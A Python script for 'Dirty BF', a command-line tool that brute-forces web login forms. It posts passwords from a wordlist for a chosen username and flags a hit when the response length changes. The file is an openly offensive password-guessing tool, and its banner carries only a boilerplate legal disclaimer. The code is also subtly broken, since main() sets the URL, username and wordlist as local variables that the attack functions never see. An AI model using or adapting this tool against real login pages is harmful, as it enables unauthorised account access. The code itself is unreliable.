#!/usr/bin/env python3
import requests
import argparse
import sys


#gloabal variables
url      = ""
username = ""
wordlist = ""
ufield   = "username"
pfield   = "password"


random_user_agent = False

headers = {
    "User-agent": "Dirty"
}

wlist    = []


def main():
    banner()
    
    parser = argparse.ArgumentParser(description=("CLI Bruteforcer for login fields."))
    
    parser.add_argument('-u', '--url', nargs='?', help="Set url to bruteforce (needed)")
    parser.add_argument('-w', '--wordlist', nargs='?', help="Path to wordlist (needed)")
    parser.add_argument('--username', nargs='?', help="Username to bruteforce (needed)")
    
    parser.add_argument('--ufield', nargs='?', help="Username field if different than 'username'")
    parser.add_argument('--pfield', nargs='?', help="Password field if different than 'password'")
    
    args = parser.parse_args()
    args = vars(args)
    
    try: 
        ufield = args["ufield"]
    except TypeError:
        pass    
    try:
        pfield = args["pfield"]
    except TypeError:
        pass
    
    try:
        url      = args["url"]
        print(f"Attacking: {url}")
        username = args["username"]
        print(f"Using username: {username}")
        wordlist = args["wordlist"]
        print(f"Using wordlist: {wordlist}")
        
        wlist = read_wordlist()
        
        bruteforce()
        
    except TypeError:
        print("You must provide all needed parameters.")
        parser.print_help()
    

def banner():
    print(
"""
(                                (     
 )\ )              )          (   )\ )  
(()/(  (   (    ( /( (      ( )\ (()/(  
 /(_)) )\  )(   )\()))\ )   )((_) /(_)) 
(_))_ ((_)(()\ (_))/(()/(  ((_)_ (_))_| 
 |   \ (_) ((_)| |_  )(_))  | _ )| |_   
 | |) || || '_||  _|| || |  | _ \| __|  
 |___/ |_||_|   \__| \_, |  |___/|_|    
                     |__/              """)
    print("Welcome to Dirty BF")
    print("[!] legal disclaimer: Usage of dirtybf for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n")

def read_wordlist():
    wlist = []
    try:
        with open(wordlist, 'r') as wl: # we try opening the file using UTF-8
            for line in wl:
                wlist.append(line.strip())
    except UnicodeDecodeError as UDE:
        try:
            if len(wlist) != 0:
                wlist = [] #we make sure the wordlist is empty
            with open(wordlist, 'r', encoding="ISO-8859-1") as wl: #Rockyou is not encoded with UTF-8.
                for line in wl:
                    wlist.append(line.strip())
        except:
            raise UnicodeDecodeError
    return wlist

def test_url(url, data):
    r = requests.post(url, data=data)
    if r.status_code == 200:
        return True
    return False

def calculate_length(url, data):
    r = requests.post(url, data=data)
    return len(r.text)
    
def bruteforce():
    data = {
        ufield: username,
        pfield: "placeholder" 
    }
    
    idx = 0
    if test_url(url, data):
        default_len = calculate_length(url, data)
        for word in wlist:
            data[pfield] = word
            r = requests.post(url, data=data, headers=headers)
            if len(r.text) != default_len:
                print(f"[~] PASSWORD FOUND : {word}")
                break
        print("[~] Done")
    else:
        print("[~] URL can't be bruteforced.")
        
if __name__ == '__main__':
    main()